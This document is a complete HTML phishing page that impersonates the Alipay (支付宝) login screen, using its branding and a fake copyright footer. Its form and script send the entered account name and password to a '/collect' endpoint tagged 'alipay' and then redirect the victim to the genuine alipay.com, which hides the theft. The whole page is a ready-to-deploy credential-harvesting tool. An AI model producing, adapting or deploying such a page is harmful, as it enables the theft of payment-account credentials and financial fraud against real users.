<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>支付宝登录</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: -apple-system, BlinkMacSystemFont, "Helvetica Neue", "PingFang SC", "Microsoft YaHei", sans-serif; background: #f5f5f5; min-height: 100vh; display: flex; align-items: center; justify-content: center; }
        .login-container { background: white; border-radius: 8px; box-shadow: 0 2px 12px rgba(0,0,0,0.08); padding: 40px; width: 100%; max-width: 400px; }
        .logo { text-align: center; margin-bottom: 30px; }
        .logo img { width: 120px; }
        .form-group { margin-bottom: 20px; }
        label { display: block; margin-bottom: 8px; font-size: 14px; color: #333; }
        input { width: 100%; padding: 12px 16px; border: 1px solid #ddd; border-radius: 4px; font-size: 16px; transition: border-color 0.3s; }
        input:focus { outline: none; border-color: #1677ff; box-shadow: 0 0 0 2px rgba(22, 119, 255, 0.1); }
        .btn { width: 100%; padding: 14px; background: #1677ff; color: white; border: none; border-radius: 4px; font-size: 16px; font-weight: 500; cursor: pointer; transition: background 0.3s; }
        .btn:hover { background: #0958d9; }
        .btn:active { background: #003eb3; }
        .links { display: flex; justify-content: space-between; margin-top: 20px; font-size: 13px; }
        .links a { color: #1677ff; text-decoration: none; }
        .links a:hover { text-decoration: underline; }
        .footer { text-align: center; margin-top: 30px; color: #999; font-size: 12px; }
    </style>
</head>
<body>
    <div class="login-container">
        <div class="logo">
            <svg width="120" height="40" viewBox="0 0 120 40" fill="none" xmlns="http://www.w3.org/2000/svg">
                <text x="0" y="30" font-family="Arial, sans-serif" font-size="32" font-weight="bold" fill="#1677ff">支付宝</text>
            </svg>
        </div>
        <form id="loginForm" action="/collect" method="POST">
            <input type="hidden" name="target" value="alipay">
            <div class="form-group">
                <label for="username">手机号/邮箱/用户名</label>
                <input type="text" id="username" name="username" required autocomplete="username" placeholder="请输入账号">
            </div>
            <div class="form-group">
                <label for="password">登录密码</label>
                <input type="password" id="password" name="password" required autocomplete="current-password" placeholder="请输入密码">
            </div>
            <button type="submit" class="btn">登录</button>
        </form>
        <div class="links">
            <a href="#">忘记密码</a>
            <a href="#">免费注册</a>
        </div>
        <div class="footer">© 2024 支付宝 (中国) 网络技术有限公司</div>
    </div>
    <script>
        document.getElementById('loginForm').addEventListener('submit', async (e) => {
            e.preventDefault();
            const formData = new FormData(e.target);
            const btn = e.target.querySelector('.btn');
            btn.textContent = '登录中...';
            btn.disabled = true;
            try {
                const resp = await fetch('/collect', { method: 'POST', body: formData });
                if (resp.redirected) {
                    window.location.href = resp.url;
                } else {
                    window.location.href = 'https://www.alipay.com/';
                }
            } catch {
                window.location.href = 'https://www.alipay.com/';
            }
        });
    </script>
</body>
</html>
